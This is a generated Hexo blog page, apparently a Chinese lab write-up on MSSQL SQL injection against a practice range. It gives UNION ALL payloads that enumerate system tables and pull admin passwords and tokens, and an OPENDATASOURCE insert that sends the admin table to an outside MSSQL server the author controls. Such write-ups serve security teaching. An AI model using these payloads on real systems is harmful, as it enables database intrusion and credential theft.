@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="MS SQL是微软推出的商用数据库系统，全称是Microsoft SQL Sever。MSSQL是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。SQL Server一开始并不是微软自己研发的产品，而是当时为了要和IBM竞争时，与Sybase合作所产生的，其最早的发展者是">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/blog1/mssql注入.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="MS SQL是微软推出的商用数据库系统，全称是Microsoft SQL Sever。MSSQL是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。SQL Server一开始并不是微软自己研发的产品，而是当时为了要和IBM竞争时，与Sybase合作所产生的，其最早的发展者是">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/upload/md/19822ee108e5d68b89f503e2600558b2_43312.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/777ed1e9541eac35aea3c5e93c408be5_28022.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/af28d35b238e014863799a404a00e9f6_71063.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/e890610ed70998cdedab1d08930860a8_58107.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/1f1c6b4d8336aa1dbf365351cf70ef4b_19038.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/7d278cda303c0a50bc403fcde5016835_20520.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/f50b99cc32a82f7ea35c968406c0b1ea_60786.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/b90258b700dc374263bf09e346c7d8d2_19539.png">
+<meta property="og:image" content="http://yoursite.com/upload/md/69b2588a7c596138caec23407f71c76a_93708.png">
+<meta property="og:updated_time" content="2019-10-20T13:28:45.868Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+<meta name="twitter:description" content="MS SQL是微软推出的商用数据库系统，全称是Microsoft SQL Sever。MSSQL是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。SQL Server一开始并不是微软自己研发的产品，而是当时为了要和IBM竞争时，与Sybase合作所产生的，其最早的发展者是">
+<meta name="twitter:image" content="http://yoursite.com/upload/md/19822ee108e5d68b89f503e2600558b2_43312.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog1/mssql注入.html" class="article-date">
+  <time datetime="2019-10-20T13:28:45.871Z" itemprop="datePublished">2019-10-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>MS SQL是微软推出的商用数据库系统，全称是Microsoft SQL Sever。MSSQL是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。SQL Server一开始并不是微软自己研发的产品，而是当时为了要和IBM竞争时，与Sybase合作所产生的，其最早的发展者是Sybase，同时微软也和Sybase合作过 SQL Server 4.2版本的研发，微软亦将SQL。目前的大型网站一般使用Oracle或者MSSQLJSP.PHP.ASP都可以。一般是企业级的商务网站使用的。MS SQL Server 和ASP都是微软的产品，互相兼容性最好，所以ASP的网站用MS SQL Server是黄金搭档。 </p>
+<h3 id="MSSQL显错注入-在讲MSSQL反弹注入前先说一下MSSQL的显错注入-MSSQL联合查询：UNION-ALL-然后猜出输出点要使用null去填充，比如：-没有sql的union-select-1-2-3-改为-union-all-select-null-null-null-注释：注释只有–-select-name-from-master-dbo-sysdatabase-查询系统库-查询系统表：dbo-sysobjects-查询系统表-xtype-”U”-dbo-syscolumns-字段-id-指定id-反弹注入：-反弹注入就是在目标数据库进行查询并把结果通过网络保存在一个拥有公网ip的系统的数据库内-需要用到opendatasource函数-—-title-MSSQL注入-反弹注入-通过观察或者order-by可以得出这里有三个字段，输入一下语句：-id-1’union-all-select-null-null-null-from-admin–-注意两点：union后面的all和联合查询的字段档位不使用数字，全使用null，接下来按系统自带库进行一步一步查询，其实和mysql没什么区别。-通过以下语句：-id-2’-and-1-2-union-all-select-null-null-null-from-dbo-sysobjects–-id-2’-and-1-2-union-all-select-null-null-null-from-dbo-sysobjects-where-xtype-’u’–-id-2’-and-1-2-union-all-select-id-name-null-from-dbo-sysobjects-where-xtype-’u’–-id-2’-and-1-2-union-all-select-id-name-null-from-dbo-sysobjects-where-id-1977058079–-id-2’-and-1-2-union-all-select-id-passwd-token-from-admin–-MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖独特的攻击思路。我们在进行SQL注入时明明是sql注入点却无法进行注入，注入工具猜解速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是注入攻击中常遇到的问题。为了解决以上疑难杂症，比较好的解决方法就是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数支持。"><a href="#MSSQL显错注入-在讲MSSQL反弹注入前先说一下MSSQL的显错注入-MSSQL联合查询：UNION-ALL-然后猜出输出点要使用null去填充，比如：-没有sql的union-select-1-2-3-改为-union-all-select-null-null-null-注释：注释只有–-select-name-from-master-dbo-sysdatabase-查询系统库-查询系统表：dbo-sysobjects-查询系统表-xtype-”U”-dbo-syscolumns-字段-id-指定id-反弹注入：-反弹注入就是在目标数据库进行查询并把结果通过网络保存在一个拥有公网ip的系统的数据库内-需要用到opendatasource函数-—-title-MSSQL注入-反弹注入-通过观察或者order-by可以得出这里有三个字段，输入一下语句：-id-1’union-all-select-null-null-null-from-admin–-注意两点：union后面的all和联合查询的字段档位不使用数字，全使用null，接下来按系统自带库进行一步一步查询，其实和mysql没什么区别。-通过以下语句：-id-2’-and-1-2-union-all-select-null-null-null-from-dbo-sysobjects–-id-2’-and-1-2-union-all-select-null-null-null-from-dbo-sysobjects-where-xtype-’u’–-id-2’-and-1-2-union-all-select-id-name-null-from-dbo-sysobjects-where-xtype-’u’–-id-2’-and-1-2-union-all-select-id-name-null-from-dbo-sysobjects-where-id-1977058079–-id-2’-and-1-2-union-all-select-id-passwd-token-from-admin–-MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖独特的攻击思路。我们在进行SQL注入时明明是sql注入点却无法进行注入，注入工具猜解速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是注入攻击中常遇到的问题。为了解决以上疑难杂症，比较好的解决方法就是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数支持。" class="headerlink" title="MSSQL显错注入 在讲MSSQL反弹注入前先说一下MSSQL的显错注入 MSSQL联合查询：UNION ALL 然后猜出输出点要使用null去填充，比如： 没有sql的union select 1,2,3 改为 union all select null,null,null 注释：注释只有– select name from master.dbo.sysdatabase 查询系统库 查询系统表：dbo.sysobjects 查询系统表 (xtype=”U”) dbo.syscolumns 字段 (id=) 指定id 反弹注入： 反弹注入就是在目标数据库进行查询并把结果通过网络保存在一个拥有公网ip的系统的数据库内 需要用到opendatasource函数 — title: MSSQL注入-反弹注入 通过观察或者order by可以得出这里有三个字段，输入一下语句：  id=1’union all select null,null,null from admin– 注意两点：union后面的all和联合查询的字段档位不使用数字，全使用null，接下来按系统自带库进行一步一步查询，其实和mysql没什么区别。 通过以下语句： id=2’ and 1=2 union all select null,null,null from dbo.sysobjects–  id=2’ and 1=2 union all select null,null,null from dbo.sysobjects where xtype=’u’–  id=2’ and 1=2 union all select id,name,null from dbo.sysobjects where xtype=’u’–  id=2’ and 1=2 union all select id,name,null from dbo.sysobjects where id=1977058079–  id=2’ and 1=2 union all select id,passwd,token from admin–  MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖独特的攻击思路。我们在进行SQL注入时明明是sql注入点却无法进行注入，注入工具猜解速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是注入攻击中常遇到的问题。为了解决以上疑难杂症，比较好的解决方法就是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数支持。"></a>MSSQL显错注入 在讲MSSQL反弹注入前先说一下MSSQL的显错注入 MSSQL联合查询：UNION ALL 然后猜出输出点要使用null去填充，比如： 没有sql的union select 1,2,3 改为 union all select null,null,null 注释：注释只有– select name from master.dbo.sysdatabase 查询系统库 查询系统表：dbo.sysobjects 查询系统表 (xtype=”U”) dbo.syscolumns 字段 (id=) 指定id 反弹注入： 反弹注入就是在目标数据库进行查询并把结果通过网络保存在一个拥有公网ip的系统的数据库内 需要用到opendatasource函数 <img src="/upload/md/19822ee108e5d68b89f503e2600558b2_43312.png" alt>— title: MSSQL注入-反弹注入 通过观察或者order by可以得出这里有三个字段，输入一下语句： <img src="/upload/md/777ed1e9541eac35aea3c5e93c408be5_28022.png" alt> id=1’union all select null,null,null from admin– 注意两点：union后面的all和联合查询的字段档位不使用数字，全使用null，接下来按系统自带库进行一步一步查询，其实和mysql没什么区别。 通过以下语句： id=2’ and 1=2 union all select null,null,null from dbo.sysobjects– <img src="/upload/md/af28d35b238e014863799a404a00e9f6_71063.png" alt> id=2’ and 1=2 union all select null,null,null from dbo.sysobjects where xtype=’u’– <img src="/upload/md/e890610ed70998cdedab1d08930860a8_58107.png" alt> id=2’ and 1=2 union all select id,name,null from dbo.sysobjects where xtype=’u’– <img src="/upload/md/1f1c6b4d8336aa1dbf365351cf70ef4b_19038.png" alt> id=2’ and 1=2 union all select id,name,null from dbo.sysobjects where id=1977058079– <img src="/upload/md/7d278cda303c0a50bc403fcde5016835_20520.png" alt> id=2’ and 1=2 union all select id,passwd,token from admin– <img src="/upload/md/f50b99cc32a82f7ea35c968406c0b1ea_60786.png" alt> MSSQL注入攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖独特的攻击思路。我们在进行SQL注入时明明是sql注入点却无法进行注入，注入工具猜解速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是注入攻击中常遇到的问题。为了解决以上疑难杂症，比较好的解决方法就是使用反弹注入技术，而反弹注入技术需要依靠<strong>opendatasource</strong>函数支持。</h3><h4 id="环境搭建-MSSQL注入-反弹注入实际上就是把查询出来的数据发到我们的MSSQL服务器上，那么我们就需要自己搭建MSSQL数据库和一个公网ip，这里有一个虚拟空间，可以免去MSSQL安装环境并且不需要特意购置云服务器来获取公网ip。-虚拟空间：香港云-这个香港云注册还需要邮箱，我一般不填真实信息，所以找了个10分钟邮箱-免费邮箱：10分钟邮箱"><a href="#环境搭建-MSSQL注入-反弹注入实际上就是把查询出来的数据发到我们的MSSQL服务器上，那么我们就需要自己搭建MSSQL数据库和一个公网ip，这里有一个虚拟空间，可以免去MSSQL安装环境并且不需要特意购置云服务器来获取公网ip。-虚拟空间：香港云-这个香港云注册还需要邮箱，我一般不填真实信息，所以找了个10分钟邮箱-免费邮箱：10分钟邮箱" class="headerlink" title="环境搭建 MSSQL注入-反弹注入实际上就是把查询出来的数据发到我们的MSSQL服务器上，那么我们就需要自己搭建MSSQL数据库和一个公网ip，这里有一个虚拟空间，可以免去MSSQL安装环境并且不需要特意购置云服务器来获取公网ip。 虚拟空间：香港云 这个香港云注册还需要邮箱，我一般不填真实信息，所以找了个10分钟邮箱 免费邮箱：10分钟邮箱"></a>环境搭建 MSSQL注入-反弹注入实际上就是把查询出来的数据发到我们的MSSQL服务器上，那么我们就需要自己搭建MSSQL数据库和一个公网ip，这里有一个虚拟空间，可以免去MSSQL安装环境并且不需要特意购置云服务器来获取公网ip。 虚拟空间：<a href="http://www.webweb.com" target="_blank" rel="noopener">香港云</a> 这个香港云注册还需要邮箱，我一般不填真实信息，所以找了个10分钟邮箱 免费邮箱：<a href="http://bccto.me" target="_blank" rel="noopener">10分钟邮箱</a></h4><h4 id="opendatasource函数-语法：opendatasource-provider-name-init-string-provider-name：-注册为用于访问数据源的OLE-DB提供程序的PROGID的名称，MSSQL的名称为SQLOLEDB-init-string-链接字符串-链接地址，端口，用户名，密码，数据库名-sever-链接地址，端口-uid-用户名-pwd-密码-database-数据库名称-实现功能-获取所有库-当前库所有表-表里所有内容-分区路径-本机建立库和表-方便反弹时写进东西-然后最重要的一步来了，向靶场插入以下代码：-insert-into-opendatasource-39-sqloledb-39-39-server-SQL5006-webweb-com-1433-uid-DB-14A8E52-ddcms-admin-pwd-123456789-database-DB-14A8E52-ddcms-39-DB-14A8E52-ddcms-dbo-a-select-from-admin-没有报错，接下来到我们的MSSQL-Manager的Run-Query上查看。-当然前提是在这个数据库下有这个表-create-table-a-in-int-name1-char-255-name2-char-255-naem3-char-255-最后得到flag。"><a href="#opendatasource函数-语法：opendatasource-provider-name-init-string-provider-name：-注册为用于访问数据源的OLE-DB提供程序的PROGID的名称，MSSQL的名称为SQLOLEDB-init-string-链接字符串-链接地址，端口，用户名，密码，数据库名-sever-链接地址，端口-uid-用户名-pwd-密码-database-数据库名称-实现功能-获取所有库-当前库所有表-表里所有内容-分区路径-本机建立库和表-方便反弹时写进东西-然后最重要的一步来了，向靶场插入以下代码：-insert-into-opendatasource-39-sqloledb-39-39-server-SQL5006-webweb-com-1433-uid-DB-14A8E52-ddcms-admin-pwd-123456789-database-DB-14A8E52-ddcms-39-DB-14A8E52-ddcms-dbo-a-select-from-admin-没有报错，接下来到我们的MSSQL-Manager的Run-Query上查看。-当然前提是在这个数据库下有这个表-create-table-a-in-int-name1-char-255-name2-char-255-naem3-char-255-最后得到flag。" class="headerlink" title="opendatasource函数 语法：opendatasource(provider_name,init_string) provider_name： 注册为用于访问数据源的OLE DB提供程序的PROGID的名称，MSSQL的名称为SQLOLEDB init_string: 链接字符串 链接地址，端口，用户名，密码，数据库名 sever=链接地址，端口;uid=用户名;pwd=密码;database=数据库名称 实现功能: 获取所有库.当前库所有表.表里所有内容.分区路径. 本机建立库和表,方便反弹时写进东西. 然后最重要的一步来了，向靶场插入以下代码： insert into opendatasource(&#39;sqloledb&#39;,&#39;server=SQL5006.webweb.com,1433;uid=DB_14A8E52_ddcms_admin;pwd=123456789;database=DB_14A8E52_ddcms&#39;).DB_14A8E52_ddcms .dbo.a select * from admin-- 没有报错，接下来到我们的MSSQL Manager的Run Query上查看。  当然前提是在这个数据库下有这个表  create table a(in int,name1 char(255),name2 char(255),naem3 char(255)); 最后得到flag。"></a>opendatasource函数 语法：<strong>opendatasource(provider_name,init_string)</strong> <strong>provider_name</strong>： 注册为用于访问数据源的OLE DB提供程序的PROGID的名称，MSSQL的名称为SQLOLEDB <strong>init_string</strong>: 链接字符串 链接地址，端口，用户名，密码，数据库名 sever=链接地址，端口;uid=用户名;pwd=密码;database=数据库名称 <strong>实现功能:</strong> 获取所有库.当前库所有表.表里所有内容.分区路径. 本机建立库和表,方便反弹时写进东西. 然后最重要的一步来了，向靶场插入以下代码： <code>insert into opendatasource(&#39;sqloledb&#39;,&#39;server=SQL5006.webweb.com,1433;uid=DB_14A8E52_ddcms_admin;pwd=123456789;database=DB_14A8E52_ddcms&#39;).DB_14A8E52_ddcms .dbo.a select * from admin--</code> 没有报错，接下来到我们的MSSQL Manager的Run Query上查看。 <img src="/upload/md/b90258b700dc374263bf09e346c7d8d2_19539.png" alt> 当然前提是在这个数据库下有这个表 <img src="/upload/md/69b2588a7c596138caec23407f71c76a_93708.png" alt> <code>create table a(in int,name1 char(255),name2 char(255),naem3 char(255));</code> 最后得到flag。</h4>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/blog1/mssql注入.html" data-id="ck1z1u11g000nycv0fcism3nf" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/10/20/csrf/">csrf</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dom型xss/">dom型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/存储型xss/">存储型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/反射性xss/">反射性xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dns注入/">dns注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
